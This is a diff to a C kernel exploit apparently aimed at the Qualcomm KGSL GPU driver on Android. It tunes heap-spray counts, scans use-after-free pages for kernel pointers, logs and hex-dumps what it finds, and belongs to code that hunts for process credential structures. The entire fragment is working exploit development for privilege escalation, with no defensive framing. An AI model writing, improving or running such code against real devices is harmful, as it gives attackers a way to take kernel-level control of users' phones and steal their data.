@@ -125,9 +125,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 7000
+#define SPRAY_COUNT 6000
 #define SPRAY_COUNT_STEP 1000
-#define SPRAY_COUNT_MAX 7000
+#define SPRAY_COUNT_MAX 6000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1604,11 +1604,15 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
 static void analyze_uaf_page(uint8_t *data, uint64_t va) {
     int kptrs = 0;
     int strings = 0;
+    int first_kptr_off = -1;
     char found_str[16] = {0};
     
     for (int i = 0; i < 512; i++) {
         uint64_t val = ((uint64_t*)data)[i];
-        if ((val & 0xffffffc000000000ULL) == 0xffffffc000000000ULL) kptrs++;
+        if ((val & 0xffffffc000000000ULL) == 0xffffffc000000000ULL) {
+            kptrs++;
+            if (first_kptr_off == -1) first_kptr_off = i * 8;
+        }
     }
     
     for (int i = 0; i < 4096 - 8; i++) {
@@ -1624,8 +1628,16 @@ static void analyze_uaf_page(uint8_t *data, uint64_t va) {
     }
     
     if (kptrs > 0 || strings > 0) {
-        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | Sample:\"%s\"", 
-                (unsigned long)va, kptrs, strings, found_str);
+        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d (first at +0x%x) | STRs:%d | Sample:\"%s\"", 
+                (unsigned long)va, kptrs, first_kptr_off, strings, found_str);
+        
+        // Dump first 64 bytes if many kernel pointers are found
+        if (kptrs > 40) {
+            fprintf(stderr, "\n[DUMP] ");
+            for (int i = 0; i < 64; i += 8) {
+                fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
+            }
+        }
     }
 }
 
@@ -1783,6 +1795,7 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             }
             if (has_data && pages_scanned % 128 == 0) {
                 analyze_uaf_page(bytes, current_va);
+                usleep(100); // Small pause to reduce system pressure
             }
 
             pages_scanned++;
@@ -1790,6 +1803,7 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             {
                 fprintf(stderr, ".");
                 fflush(stderr);
+                usleep(500); // Small pause after block scan
             }
 
             pid_t comm_pid = -1;
